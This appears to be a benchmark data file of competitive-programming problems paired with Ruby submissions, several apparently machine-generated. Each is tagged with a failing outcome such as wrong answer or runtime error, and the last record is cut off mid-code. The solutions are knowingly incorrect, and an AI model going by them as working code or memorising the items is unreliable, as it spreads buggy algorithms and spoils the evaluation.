{"difficulty":2000,"lang":"Ruby","lang_cluster":"ruby","src_uid":"13fa378c913bb7a15612327099b59f83","submission_id":"re_1337","tags":["dp","greedy","math","implementation","data structures","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"\nsmall_size, big_indexes = gets.chomp.split.map{|s| s.to_i}\nsmalls = []\nsmall_size.times do\n  array = gets.chomp.split.map{|s| s.to_i}\n  array.shift\n  sum = r_sum = 0\n  left = right = max = -1001\n  tmp = 0\n  array.size.times do |i|\n    sum += array[i]\n    r_sum += array[-i - 1]\n    left = [sum, left].max\n    right = [r_sum, right].max\n    max = [max, array[i]].max\n    tmp += array[i]\n    if tmp < 0\n      tmp = 0\n    else\n      max = [max, tmp].max\n    end\n  end\n  small = {\n    :sum => sum,\n    :left => left,\n    :right => right,\n    :max => max,\n  }\n  smalls << small\nend\nmax = -1001\ntmp = 0\ngets.chomp.split.map{|s| s.to_i}.each do |i|\n  i -= 1\n  max = [max, smalls[i][:max]].max\n  max = [max, tmp + smalls[i][:left]].max if tmp > 0\n  tmp = [0, [smalls[i][:right], tmp + smalls[i][:sum]].max].max\nend\nputs max\n","description":"Ahmed and Mostafa used to compete together in many programming contests for several years. Their coach Fegla asked them to solve one challenging problem, of course Ahmed was able to solve it but Mostafa couldn't.This problem is similar to a standard problem but it has a different format and constraints.In the standard problem you are given an array of integers, and you have to find one or more consecutive elements in this array where their sum is the maximum possible sum.But in this problem you are given n small arrays, and you will create one big array from the concatenation of one or more instances of the small arrays (each small array could occur more than once). The big array will be given as an array of indexes (1-based) of the small arrays, and the concatenation should be done in the same order as in this array. Then you should apply the standard problem mentioned above on the resulting big array.For example let's suppose that the small arrays are {1, 6, -2}, {3, 3} and {-5, 1}. And the indexes in the big array are {2, 3, 1, 3}. So the actual values in the big array after formatting it as concatenation of the small arrays will be {3, 3, -5, 1, 1, 6, -2, -5, 1}. In this example the maximum sum is 9.Can you help Mostafa solve this problem?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m, n is the number of the small arrays (1\u2009\u2264\u2009n\u2009\u2264\u200950), and m is the number of indexes in the big array (1\u2009\u2264\u2009m\u2009\u2264\u2009250000). Then follow n lines, the i-th line starts with one integer l which is the size of the i-th array (1\u2009\u2264\u2009l\u2009\u2264\u20095000), followed by l integers each one will be greater than or equal -1000 and less than or equal 1000. The last line contains m integers which are the indexes in the big array, and you should concatenate the small arrays in the same order, and each index will be greater than or equal to 1 and less than or equal to n. The small arrays are numbered from 1 to n in the same order as given in the input. Some of the given small arrays may not be used in big array. Note, that the array is very big. So if you try to build it straightforwardly, you will probably get time or\/and memory limit exceeded.","output_spec":"Print one line containing the maximum sum in the big array after formatting it as described above. You must choose at least one element for the sum, i. e. it cannot be empty. Please, do not use %lld specificator to write 64-bit integers in C++. It is preferred to use cout (also you may use %I64d).","notes":null,"sample_inputs":["3 4\n3 1 6 -2\n2 3 3\n2 -5 1\n2 3 1 3","6 1\n4 0 8 -3 -10\n8 3 -2 -5 10 8 -9 -5 -4\n1 0\n1 -3\n3 -8 5 6\n2 9 6\n1"],"sample_outputs":["9","8"]}
{"difficulty":1900,"lang":"Ruby","lang_cluster":"ruby","src_uid":"21_A","submission_id":"gpt3_21_A_1","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"def is_jabber_id(string)\n  # Check if the string matches the pattern for a Jabber ID\n  if string =~ \/^[\\w]{1,16}@[a-zA-Z0-9_.]{1,16}(\\\/[\\w]{1,16})?$\/\n    return \"YES\"\n  else\n    return \"NO\"\n  end\nend\n\n# Read the input\ninput = gets.chomp\n\n# Check if the input is a correct Jabber ID\nresult = is_jabber_id(input)\n\n# Print the result\nputs result\n\n","description":"Jabber ID on the national Berland service \u00abBabber\u00bb has a form <username>@<hostname>[\/resource], where   <username> \u2014 is a sequence of Latin letters (lowercase or uppercase), digits or underscores characters \u00ab_\u00bb, the length of <username> is between 1 and 16, inclusive.  <hostname> \u2014 is a sequence of word separated by periods (characters \u00ab.\u00bb), where each word should contain only characters allowed for <username>, the length of each word is between 1 and 16, inclusive. The length of <hostname> is between 1 and 32, inclusive.  <resource> \u2014 is a sequence of Latin letters (lowercase or uppercase), digits or underscores characters \u00ab_\u00bb, the length of <resource> is between 1 and 16, inclusive. The content of square brackets is optional \u2014 it can be present or can be absent.There are the samples of correct Jabber IDs: [email\u00a0protected], [email\u00a0protected]\/contest.Your task is to write program which checks if given string is a correct Jabber ID.","input_from":"standard input","output_to":"standard output","input_spec":"The input contains of a single line. The line has the length between 1 and 100 characters, inclusive. Each characters has ASCII-code between 33 and 127, inclusive.\n","output_spec":"Print YES or NO.\n","notes":null,"sample_inputs":["[email\u00a0protected]\n","[email\u00a0protected]\/contest.icpc\/12\n"],"sample_outputs":["YES\n","NO\n"]}
{"difficulty":2700,"lang":"Ruby","lang_cluster":"ruby","src_uid":"293_D","submission_id":"gpt3_293_D_0","tags":["geometry","math","probabilities","two+pointers"],"exec_outcome":"RUNTIME_ERROR","source_code":"def polygon_area(vertices)\n  n = vertices.length\n  area = 0\n\n  (0...n).each do |i|\n    x1, y1 = vertices[i]\n    x2, y2 = vertices[(i + 1) % n]\n    area += (x1 * y2 - x2 * y1)\n  end\n\n  area.abs \/ 2.0\nend\n\ndef expected_area(n, vertices)\n  polygon = []\n  vertices.each do |vertex|\n    polygon << vertex.split.map(&:to_i)\n  end\n\n  total_points = 0\n  total_area = 0\n\n  polygon.each_with_index do |vertex, i|\n    x1, y1 = vertex\n    x2, y2 = polygon[(i + 1) % n]\n\n    min_x = [x1, x2].min\n    max_x = [x1, x2].max\n    min_y = [y1, y2].min\n    max_y = [y1, y2].max\n\n    total_points += (max_x - min_x + 1) * (max_y - min_y + 1)\n    total_area += polygon_area([vertex, polygon[(i + 1) % n]])\n  end\n\n  total_area \/ total_points\nend\n\ninput = gets.chomp.split(\"\\n\")\nn = input[0].to_i\nvertices = input[1..-1]\n\nputs expected_area(n, vertices)\n","description":"Ksusha is a vigorous mathematician. She is keen on absolutely incredible mathematical riddles. Today Ksusha came across a convex polygon of non-zero area. She is now wondering: if she chooses a pair of distinct points uniformly among all integer points (points with integer coordinates) inside or on the border of the polygon and then draws a square with two opposite vertices lying in the chosen points, what will the expectation of this square's area be?A pair of distinct points is chosen uniformly among all pairs of distinct points, located inside or on the border of the polygon. Pairs of points p,q (p\u2260q) and q,p are considered the same.Help Ksusha! Count the required expectation.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (3\u2264n\u226410^5) \u2014 the number of vertices of Ksusha's convex polygon. Next n lines contain the coordinates of the polygon vertices in clockwise or counterclockwise order. The i-th line contains integers xi,yi (|xi|,|yi|\u226410^6) \u2014 the coordinates of the vertex that goes i-th in that order.\n","output_spec":"Print a single real number \u2014 the required expected area. \nThe answer will be considered correct if its absolute and relative error doesn't exceed 10^-6.\n","notes":null,"sample_inputs":["3\n0 0\n5 5\n5 0\n","4\n-1 3\n4 5\n6 2\n3 -5\n","3\n17 136\n859 937\n16 641\n"],"sample_outputs":["4.6666666667\n","8.1583333333\n","66811.3704155169\n"]}
{"difficulty":1600,"lang":"Ruby","lang_cluster":"ruby","src_uid":"34_D","submission_id":"gpt3_34_D_0","tags":["dfs+and+similar","graphs"],"exec_outcome":"WRONG_ANSWER","source_code":"def find_new_representation(n, r1, r2, roads)\n  new_representation = []\n  old_representation = roads.split.map(&:to_i)\n\n  # Find the path from the old capital to the new capital\n  path = [r2]\n  while path.last != r1\n    path << old_representation[path.last - 2]\n  end\n\n  # Reverse the path to get the new representation\n  path.reverse.each_cons(2) do |a, b|\n    new_representation << b\n  end\n\n  new_representation.join(' ')\nend\n\ninput = gets.chomp.split\nn = input[0].to_i\nr1 = input[1].to_i\nr2 = input[2].to_i\nroads = gets.chomp\n\noutput = find_new_representation(n, r1, r2, roads)\nputs output\n","description":"There are n cities in Berland. Each city has its index \u2014 an integer number from 1 to n. The capital has index r1. All the roads in Berland are two-way. The road system is such that there is exactly one path from the capital to each city, i.e. the road map looks like a tree. In Berland's chronicles the road map is kept in the following way: for each city i, different from the capital, there is kept number pi \u2014 index of the last city on the way from the capital to i.Once the king of Berland Berl XXXIV decided to move the capital from city r1 to city r2. Naturally, after this the old representation of the road map in Berland's chronicles became incorrect. Please, help the king find out a new representation of the road map in the way described above.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three space-separated integers n, r1, r2 (2\u2264n\u22645\u00b710^4,1\u2264r1\u2260r2\u2264n) \u2014 amount of cities in Berland, index of the old capital and index of the new one, correspondingly.\nThe following line contains n-1 space-separated integers \u2014 the old representation of the road map. For each city, apart from r1, there is given integer pi \u2014 index of the last city on the way from the capital to city i. All the cities are described in order of increasing indexes.\n","output_spec":"Output n-1 numbers \u2014 new representation of the road map in the same format.\n","notes":null,"sample_inputs":["3 2 3\n2 2\n","6 2 4\n6 1 2 4 2\n"],"sample_outputs":["2 3 ","6 4 1 4 2 "]}
{"difficulty":1600,"lang":"Ruby","lang_cluster":"ruby","src_uid":"46_C","submission_id":"gpt3_46_C_2","tags":["two+pointers"],"exec_outcome":"COMPILATION_ERROR","source_code":"def minimal_swaps(input)\n  n = input[0].to_i\n  positions = input[1].strip.chars\n\n  # Count the number of hamsters and tigers\n  hamster_count = positions.count('H')\n  tiger_count = positions.count('T')\n\n  # If all hamsters or all tigers are already together, no swaps needed\n  return '0' if hamster_count == n || tiger_count == n\n\n  # Find the maximum number of hamsters or tigers together\n  max_count = [hamster_count, tiger_count].max\n\n  # Find the minimum number of swaps needed to achieve the goal\n  min_swaps = n\n\n  # Iterate through each possible starting position\n  (0..n-1).each do |start|\n    # Count the number of swaps needed for this starting position\n    swaps = 0\n    (0..max_count-1).each do |i|\n      current = positions[(start + i) % n]\n      swaps += 1 if (current == 'H' && i >= tiger_count) || (current == 'T' && i >= hamster_count)\n    end\n    min_swaps = [min_swaps, swaps].min\n  end\n\n  min_swaps.to_s\nend\n\ninput = gets.chomp.split('\\n')\noutput = minimal_swaps(input)\nputs output\n","description":"Today there is going to be an unusual performance at the circus \u2014 hamsters and tigers will perform together! All of them stand in circle along the arena edge and now the trainer faces a difficult task: he wants to swap the animals' positions so that all the hamsters stood together and all the tigers also stood together. The trainer swaps the animals in pairs not to create a mess. He orders two animals to step out of the circle and swap places. As hamsters feel highly uncomfortable when tigers are nearby as well as tigers get nervous when there's so much potential prey around (consisting not only of hamsters but also of yummier spectators), the trainer wants to spend as little time as possible moving the animals, i.e. he wants to achieve it with the minimal number of swaps. Your task is to help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains number n (2\u2264n\u22641000) which indicates the total number of animals in the arena. The second line contains the description of the animals' positions. The line consists of n symbols \"H\" and \"T\". The \"H\"s correspond to hamsters and the \"T\"s correspond to tigers. It is guaranteed that at least one hamster and one tiger are present on the arena. The animals are given in the order in which they are located circle-wise, in addition, the last animal stands near the first one.\n","output_spec":"Print the single number which is the minimal number of swaps that let the trainer to achieve his goal.\n","notes":"In the first example we shouldn't move anybody because the animals of each species already stand apart from the other species. In the second example you may swap, for example, the tiger in position 2 with the hamster in position 5 and then \u2014 the tiger in position 9 with the hamster in position 7.\n","sample_inputs":["3\nHTH\n","9\nHTHTHTHHT\n"],"sample_outputs":["0\n","2\n"]}
{"difficulty":2200,"lang":"Ruby","lang_cluster":"ruby","src_uid":"5215112549723fea3f2c1fe0049e0b2e","submission_id":"re_1061","tags":["brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"n, m = gets.split.map(&:to_i)\na = []\nm.times do |t|\n\ts, c = gets.split\n\ts = s.to_i(2)\n\tc = c.to_i\n\tif t.zero? then\n\t\ta = [*0..n-1].combination(c).to_a.map{|i| i.map{|j| 1 << j}.inject{|x, y| x ^ y} || 0}\n\telse\n\t\ta.reject!{|i| (i ^ s).to_s(2).count('1') != c}\n\tend\nend\np a.size\n\n__END__\n: || 0\n","description":"Vasya tries to break in a safe. He knows that a code consists of n numbers, and every number is a 0 or a 1. Vasya has made m attempts to enter the code. After each attempt the system told him in how many position stand the right numbers. It is not said in which positions the wrong numbers stand. Vasya has been so unlucky that he hasn\u2019t entered the code where would be more than 5 correct numbers. Now Vasya is completely bewildered: he thinks there\u2019s a mistake in the system and it is self-contradictory. Help Vasya \u2014 calculate how many possible code variants are left that do not contradict the previous system responses.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains two integers n and m (6\u2009\u2264\u2009n\u2009\u2264\u200935,\u20091\u2009\u2264\u2009m\u2009\u2264\u200910) which represent the number of numbers in the code and the number of attempts made by Vasya. Then follow m lines, each containing space-separated si and ci which correspondingly indicate Vasya\u2019s attempt (a line containing n numbers which are 0 or 1) and the system\u2019s response (an integer from 0 to 5 inclusively).","output_spec":"Print the single number which indicates how many possible code variants that do not contradict the m system responses are left.","notes":null,"sample_inputs":["6 2\n000000 2\n010100 4","6 3\n000000 2\n010100 4\n111100 0","6 3\n000000 2\n010100 4\n111100 2"],"sample_outputs":["6","0","1"]}
{"difficulty":1600,"lang":"Ruby","lang_cluster":"ruby","src_uid":"52_B","submission_id":"gpt3_52_B_2","tags":["combinatorics"],"exec_outcome":"RUNTIME_ERROR","source_code":"def count_square_triangles(n, m, field)\n  count = 0\n  \n  for i in 0..n-1\n    for j in 0..m-1\n      if field[i][j] == '*'\n        for k in i+1..n-1\n          for l in j+1..m-1\n            if field[k][l] == '*' && field[i][l] == '*' && field[k][j] == '*'\n              count += 1\n            end\n          end\n        end\n      end\n    end\n  end\n  \n  return count\nend\n\ninput = gets.chomp.split('\\n')\nn, m = input[0].split.map(&:to_i)\nfield = input[1..-1]\n\nresult = count_square_triangles(n, m, field)\nputs result\n","description":"You are given a n\u00d7m field consisting only of periods ('.') and asterisks ('*'). Your task is to count all right triangles with two sides parallel to the square sides, whose vertices are in the centers of '*'-cells. A right triangle is a triangle in which one angle is a right angle (that is, a 90 degree angle).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two positive integer numbers n and m (1\u2264n,m\u22641000). The following n lines consist of m characters each, describing the field. Only '.' and '*' are allowed.\n","output_spec":"Output a single number \u2014 total number of square triangles in the field. Please, do not use %lld specificator to read or write 64-bit integers in C++. It is preffered to use cout (also you may use %I64d).\n","notes":null,"sample_inputs":["2 2\n**\n*.\n","3 4\n*..*\n.**.\n*.**\n"],"sample_outputs":["1\n","9\n"]}
{"difficulty":1700,"lang":"Ruby","lang_cluster":"ruby","src_uid":"53_B","submission_id":"gpt3_53_B_2","tags":["binary+search","implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"def cut_area(h, w)\n  max_area = 0\n  cut_height = 0\n  cut_width = 0\n\n  # Iterate through all possible cut heights\n  (0..Math.log2(h).to_i).each do |i|\n    height = 2**i\n    # Calculate the corresponding cut width based on height-to-width ratio\n    width = (height * (1.25)).to_i\n    # Check if the width is within the limits and adjust if necessary\n    width = [width, w].min\n    # Calculate the area of the cut\n    area = height * width\n\n    # Update the maximum area and cut dimensions if the current area is larger\n    if area > max_area\n      max_area = area\n      cut_height = height\n      cut_width = width\n    end\n  end\n\n  [cut_height, cut_width]\nend\n\n# Read input from standard input\ninput = gets.chomp.split.map(&:to_i)\nh = input[0]\nw = input[1]\n\n# Call the cut_area function and print the result\nresult = cut_area(h, w)\nputs result.join(' ')\n","description":"One popular blog site edits the uploaded photos like this. It cuts a rectangular area out of them so that the ratio of height to width (i.e. the height\/width quotient) can vary from 0.8 to 1.25 inclusively. Besides, at least one side of the cut area should have a size, equal to some power of number 2 (2^x for some integer x). If those rules don't indicate the size of the cut are clearly, then the way with which the cut part possesses the largest area is chosen. Of course, both sides of the cut area should be integer. If there are several answers to this problem, you should choose the answer with the maximal height.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers h and w (1\u2264h,w\u226410^9) which are the height and width of the uploaded photo in pixels.\n","output_spec":"Print two integers which are the height and width of the cut area.\n","notes":null,"sample_inputs":["2 1\n","2 2\n","5 5\n"],"sample_outputs":["1 1\n","2 2\n","5 4\n"]}
{"difficulty":1700,"lang":"Ruby","lang_cluster":"ruby","src_uid":"5ce8de80c6953cd1e6e6eefd9ad35f7e","submission_id":"re_1057","tags":["data structures","implementation","expression parsing"],"exec_outcome":"WRONG_ANSWER","source_code":"s = gets.chomp\nst = []\nseq = []\nrev = {}\nrev[')'] = '('\nrev[']'] = '['\ni = 0\ns.each_char do |c|\n    if (c == '(' || c == '[')\n        st.push([i, c])\n    elsif (st.size() > 0 && (c == ')' || c == ']') && rev[c] == st.last[1])\n        seq.push(st.last)\n        seq.push([i, c])\n        st.pop\n    else\n        while (st.size() > 0)\n            st.pop\n        end\n    end\n    i += 1\nend\nseq.sort!\nres = \"\", mx = -1, prv = -1, c = 0, t = \"\"\nfor i in seq\n    # puts \"#{i[0]} #{i[1]}\"\n    if (i[0] - prv == 1 || prv == -1)\n        c += 1 if (i[1] == '[')\n        t += i[1]\n    else\n        if (mx < c)\n            mx = c\n            res = t.dup\n            t = \"\"\n            c = 0\n            c += 1 if (i[1] == '[')\n            t += i[1]\n        end\n    end\n    prv = i[0]\nend\n\nif (mx < c)\n    mx = c\n    res = t.dup\nend\nputs mx, res\n\n","description":"A bracket sequence is a string, containing only characters \"(\", \")\", \"[\" and \"]\".A correct bracket sequence is a bracket sequence that can be transformed into a correct arithmetic expression by inserting characters \"1\" and \"+\" between the original characters of the sequence. For example, bracket sequences \"()[]\", \"([])\" are correct (the resulting expressions are: \"(1)+[1]\", \"([1+1]+1)\"), and \"](\" and \"[\" are not. The empty string is a correct bracket sequence by definition.A substring s[l... r] (1\u2009\u2264\u2009l\u2009\u2264\u2009r\u2009\u2264\u2009|s|) of string s\u2009=\u2009s1s2... s|s| (where |s| is the length of string s) is the string slsl\u2009+\u20091... sr. The empty string is a substring of any string by definition.You are given a bracket sequence, not necessarily correct. Find its substring which is a correct bracket sequence and contains as many opening square brackets \u00ab[\u00bb as possible.","input_from":"standard input","output_to":"standard output","input_spec":"The first and the only line contains the bracket sequence as a string, consisting only of characters \"(\", \")\", \"[\" and \"]\". It is guaranteed that the string is non-empty and its length doesn't exceed 105 characters.","output_spec":"In the first line print a single integer \u2014 the number of brackets \u00ab[\u00bb in the required bracket sequence. In the second line print the optimal sequence. If there are more than one optimal solutions print any of them.","notes":null,"sample_inputs":["([])","((("],"sample_outputs":["1\n([])","0"]}
{"difficulty":1300,"lang":"Ruby","lang_cluster":"ruby","src_uid":"77b5f83cdadf4b0743618a46b646a849","submission_id":"86ab1634db3cc12334040cb8056b45da","tags":["dp","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"num = gets.chomp\n\nnum_of_four = 0\nnum_of_seven = 0\nans_num = \"\"\nlen = num.length\n\ndef get_bigger len\n  ans_num = \"4\"\n  append_times = len \/ 2\n  append_times.times { ans_num << \"4\" }\n  append_times.times { ans_num << \"7\" }\n  ans_num << \"7\"\nend\n\ndef get_rest(ans_num, len, num_of_four, num_of_seven)\n  rest_four = len \/ 2 - num_of_four\n  rest_seven = len \/ 2 - num_of_seven\n  rest_four.times { ans_num << \"4\" }\n  rest_seven.times { ans_num << \"7\" }\n  return ans_num\nend\n\nif num[0] > \"7\" || len % 2 == 1\n  ans_num = ans_num << (get_bigger len)\n\nelse\n  index = len\n  for i in 0...len\n    if num[i] == \"4\" #many 4\n      num_of_four = num_of_four + 1\n      if num_of_four > len \/ 2\n        num_of_four = num_of_four - 1\n        index = i\n        break\n      end\n\n    elsif num[i] == \"7\" #many 7\n      num_of_seven = num_of_seven + 1\n      if num_of_seven > len \/ 2\n        num_of_seven = num_of_seven - 1\n        index = i\n        break\n      end\n\n    else\n      index = i\n      break\n    end\n  end\n  \n  if index == len\n    ans_num = num\n  elsif num[index] <= \"4\"\n    ans_num = ans_num << num[0...index]\n    ans_num = get_rest ans_num, len, num_of_four, num_of_seven\n\n  elsif num[index] < \"7\"\n    if len \/ 2 - num_of_seven != 0\n      ans_num = ans_num << num[0...index]\n      ans_num << \"7\"\n      num_of_seven = num_of_seven + 1\n      ans_num = get_rest ans_num, len, num_of_four, num_of_seven\n    else\n      index = index - 1\n      while index >= 0\n        if num[index] == \"4\"\n          num_of_four = num_of_four - 1\n          break if len \/ 2 - num_of_seven != 0\n        end\n        num_of_seven = num_of_seven - 1\n        index = index - 1\n      end\n      if index == -1\n        ans_num = get_bigger len\n      else\n        ans_num = ans_num << num[0...index]\n        ans_num << \"7\"\n        num_of_seven = num_of_seven + 1\n        ans_num = get_rest ans_num, len, num_of_four, num_of_seven\n      end\n    end\n  else\n    index = index - 1\n    while index >= 0\n      if num[index] == \"4\"\n        num_of_four = num_of_four - 1\n        break if len \/ 2 - num_of_seven != 0\n      end\n      num_of_seven = num_of_seven - 1\n      index = index - 1\n    end\n    if index == -1\n      ans_num = get_bigger len\n    else\n      ans_num = ans_num << num[0...index]\n      ans_num << \"7\"\n      num_of_seven = num_of_seven + 1\n      ans_num = get_rest ans_num, len, num_of_four, num_of_seven\n    end\n  end\nend\n\nputs ans_num\n","description":"Petya loves lucky numbers. Everybody knows that positive integers are lucky if their decimal representation doesn't contain digits other than 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.Lucky number is super lucky if it's decimal representation contains equal amount of digits 4 and 7. For example, numbers 47, 7744, 474477 are super lucky and 4, 744, 467 are not.One day Petya came across a positive integer n. Help him to find the least super lucky number which is not less than n.","input_from":"standard input","output_to":"standard output","input_spec":"The only line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u200910100000). This number doesn't have leading zeroes.","output_spec":"Output the least super lucky number that is more than or equal to n.","notes":null,"sample_inputs":["4500","47"],"sample_outputs":["4747","47"]}
{"difficulty":2500,"lang":"Ruby","lang_cluster":"ruby","src_uid":"98e3182f047a7e7b10be7f207b219267","submission_id":"bccadf04d02ff000fb0738face0dfc8c","tags":["constructive algorithms","implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"$numAs=Array.new(1, 0)\n$numBs=Array.new(1, 0)\n$numAs1=Array.new(1, 0)\n$numBs1=Array.new(1, 0)\n\ndef f(a, b, c, d)\n    nA=[b-a+1, $numAs[b]].min\n    nB=$numBs[b]-$numBs[a-1]\n    nA1=[d-c+1, $numAs1[d]].min\n    nB1=$numBs1[d]-$numBs1[c-1]\n#    print nA, nB, nA1, nB1, \"\\n\"\n    if (nB==nB1)\n        if (nA>=nA1 && (nA%3)==(nA1%3))\n            print 1\n        else\n            print 0\n        end\n    elsif (nB<nB1)\n        if (nB==0)\n            nA-=1\n        end\n        if (nA>=nA1)\n            print 1\n        else\n            print 0\n        end\n    else\n        print 0\n    end\nend\n\ns=gets \ns1=gets \nn=gets.to_i\n(0..s.length-1).each{|x| $numBs.push($numBs[x]+(s[x]==\"B\" || s[x]==\"C\" ? 1 : 0 ))}\n(0..s1.length-1).each{|x| $numBs1.push($numBs1[x]+(s1[x]==\"B\" || s1[x]==\"C\" ? 1 : 0 ))}\n(0..s.length-1).each{|x| $numAs.push(s[x]=='A' ? $numAs[x]+1 : 0)}\n(0..s1.length-1).each{|x| $numAs1.push(s1[x]=='A' ? $numAs1[x]+1 : 0)}\nt=Array.new\nfor i in 0...n\n  t=gets.split(' ').collect{|x| x.to_i}\n  f(t[0], t[1], t[2], t[3])\nend\n\n\n","description":"Alice has a string consisting of characters 'A', 'B' and 'C'. Bob can use the following transitions on any substring of our string in any order any number of times:   A  BC  B  AC  C  AB  AAA  empty string Note that a substring is one or more consecutive characters. For given queries, determine whether it is possible to obtain the target string from source.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a string S (1\u2009\u2264\u2009|S|\u2009\u2264\u2009105). The second line contains a string T (1\u2009\u2264\u2009|T|\u2009\u2264\u2009105), each of these strings consists only of uppercase English letters 'A', 'B' and 'C'. The third line contains the number of queries Q (1\u2009\u2264\u2009Q\u2009\u2264\u2009105). The following Q lines describe queries. The i-th of these lines contains four space separated integers ai, bi, ci, di. These represent the i-th query: is it possible to create T[ci..di] from S[ai..bi] by applying the above transitions finite amount of times? Here, U[x..y] is a substring of U that begins at index x (indexed from 1) and ends at index y. In particular, U[1..|U|] is the whole string U. It is guaranteed that 1\u2009\u2264\u2009a\u2009\u2264\u2009b\u2009\u2264\u2009|S| and 1\u2009\u2264\u2009c\u2009\u2264\u2009d\u2009\u2264\u2009|T|.","output_spec":"Print a string of Q characters, where the i-th character is '1' if the answer to the i-th query is positive, and '0' otherwise.","notes":"NoteIn the first query we can achieve the result, for instance, by using transitions .The third query asks for changing AAB to A\u00a0\u2014 but in this case we are not able to get rid of the character 'B'.","sample_inputs":["AABCCBAAB\nABCB\n5\n1 3 1 2\n2 2 2 4\n7 9 1 1\n3 4 2 3\n4 5 1 3"],"sample_outputs":["10011"]}
{"difficulty":1600,"lang":"Ruby","lang_cluster":"ruby","src_uid":"a17bac596b1f060209534cbffdf0f40e","submission_id":"re_1514","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"n, k = gets.split.collect{|x| x.to_i}\n\nold_scheme = \"aaaa\"\n(1..n).each{\n  scheme = nil\n  lines = Array.new(4) { gets.chomp }\n  \n  lines.each_index{|i|\n    pos = []\n    lines[i].scan(\/[aeiou]\/){pos << $~.begin(0)}\n    if pos[-k].nil?\n      puts \"NO\"\n      exit\n    end\n    lines[i] = lines[i][pos[-k]..-1]\n  }\n\n  scheme = \"aabb\" if lines[0] == lines[1] and lines[2] == lines[3]\n  scheme = \"abab\" if lines[0] == lines[2] and lines[1] == lines[3]\n  scheme = \"abba\" if lines[0] == lines[3] and lines[1] == lines[2]\n  scheme = \"aaaa\" if lines[0] == lines[1] and lines[1] == lines[2] and lines[2] == lines[3]    \n  if scheme.nil? or (old_scheme != scheme and old_scheme != \"aaaa\")\n    puts \"NO\"\n    exit\n  end\n   \n  old_scheme = scheme\n}\n\nputs old_scheme","description":"Vera adores poems. All the poems Vera knows are divided into quatrains (groups of four lines) and in each quatrain some lines contain rhymes.Let's consider that all lines in the poems consist of lowercase Latin letters (without spaces). Letters \"a\", \"e\", \"i\", \"o\", \"u\" are considered vowels.Two lines rhyme if their suffixes that start from the k-th vowels (counting from the end) match. If a line has less than k vowels, then such line can't rhyme with any other line. For example, if k\u2009=\u20091, lines commit and hermit rhyme (the corresponding suffixes equal it), and if k\u2009=\u20092, they do not rhyme (ommit\u2009\u2260\u2009ermit).Today on a literature lesson Vera learned that quatrains can contain four different schemes of rhymes, namely the following ones (the same letters stand for rhyming lines):   Clerihew (aabb);  Alternating (abab);  Enclosed (abba). If all lines of a quatrain pairwise rhyme, then the quatrain can belong to any rhyme scheme (this situation is represented by aaaa).If all quatrains of a poem belong to the same rhyme scheme, then we can assume that the whole poem belongs to this rhyme scheme. If in each quatrain all lines pairwise rhyme, then the rhyme scheme of the poem is aaaa. Let us note that it doesn't matter whether lines from different quatrains rhyme with each other or not. In other words, it is possible that different quatrains aren't connected by a rhyme.Vera got a long poem as a home task. The girl has to analyse it and find the poem rhyme scheme. Help Vera cope with the task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u20092500, 1\u2009\u2264\u2009k\u2009\u2264\u20095)\u00a0\u2014 the number of quatrains in the poem and the vowel's number, correspondingly. Next 4n lines contain the poem. Each line is not empty and only consists of small Latin letters. The total length of the lines does not exceed 104. If we assume that the lines are numbered starting from 1, then the first quatrain contains lines number 1, 2, 3, 4; the second one contains lines number 5, 6, 7, 8; and so on.","output_spec":"Print the rhyme scheme of the poem as \"aabb\", \"abab\", \"abba\", \"aaaa\"; or \"NO\" if the poem does not belong to any of the above mentioned schemes.","notes":"NoteIn the last sample both quatrains have rhymes but finding the common scheme is impossible, so the answer is \"NO\".","sample_inputs":["1 1\nday\nmay\nsun\nfun","1 1\nday\nmay\ngray\nway","2 1\na\na\na\na\na\na\ne\ne","2 1\nday\nmay\nsun\nfun\ntest\nhill\nfest\nthrill"],"sample_outputs":["aabb","aaaa","aabb","NO"]}
{"difficulty":1600,"lang":"Ruby","lang_cluster":"ruby","src_uid":"a6cba17c5ddb93f6741e00280fb6c54c","submission_id":"re_1359","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"n, m = gets.split.map(&:to_i)\nidentifiers = {}\nmemory_blocks = {}\nidentifier = 1\n\nn.times do\n\tcommand = gets.split(' ')\t\n\tcase command[0]\n\t\twhen \"alloc\"\n\t\t\tstart_index = 0\n\t\t\tblock_size = command[1].to_i\n\t\t\tfit = false\n\t\t\twhile memory_blocks[start_index]\n\t\t\t\tstart_index += memory_blocks[start_index]\n\t\t\tend\n\t\t\twhile start_index + block_size <= m \n\t\t\t\tbreak if block_size == m && !memory_blocks.empty?\n\t\t\t\tcheck = memory_blocks.select { |k, v| (k < start_index + block_size) && (k >= start_index) }\n\t\t\t\tif check.empty?\n\t\t\t\t\tmemory_blocks[start_index] = block_size\n\t\t\t\t\tidentifiers[identifier] = start_index\n\t\t\t\t\tputs identifier\n\t\t\t\t\tidentifier += 1\n\t\t\t\t\tfit = true\n\t\t\t\t\tputs \"memory_blocks is #{memory_blocks}\"\n\t\t\t\t\tputs \"identifiers is #{identifiers}\"\n\t\t\t\t\tbreak\n\t\t\t\telse\n\t\t\t\t\tnext_index = check.min\n\t\t\t\t\tstart_index = next_index[0] + memory_blocks[next_index[0]]\n\t\t\t\tend\n\t\t\tend\n\t\t\tputs \"NULL\" unless fit\n\t\twhen \"erase\"\n\t\t\td_iden = command[1].to_i\n\t\t\tiden_index = identifiers[d_iden]\n\t\t\tif iden_index.nil?\n\t\t\t\tputs 